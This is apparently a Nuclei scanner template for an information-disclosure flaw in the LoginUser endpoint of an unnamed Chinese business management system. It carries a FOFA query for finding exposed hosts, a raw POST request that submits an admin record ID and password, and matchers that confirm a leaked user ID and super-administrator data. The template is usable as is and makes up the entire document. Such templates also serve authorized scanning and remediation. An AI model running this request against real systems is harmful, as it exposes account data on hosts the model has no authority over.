id: chanpin-manager-LoginUser-disclosure
info:
  name: 某业务管理系统 LoginUser - disclosure
  author: leadlife
  severity: high
  description: 
  reference: 
    - https://github.com/wy876/POC/blob/main/%E6%9F%90%E4%B8%9A%E5%8A%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E6%9F%90%E4%B8%9A%E5%8A%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FLoginUser%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="/Content/LayuiAdmin/login/css/index.css"
  tags: disclosure


http:
  - raw:
      - |
        POST /Login/LoginUser HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 79
        Accept: application/json, text/javascript, */*; q=0.01
        X-Requested-With: XMLHttpRequest
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Connection: keep-alive

        {"RecordID":"admin","password":"11111","undefined":"登录","language":"zh-CN"}

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'success','USERID','超级管理员')
        condition: and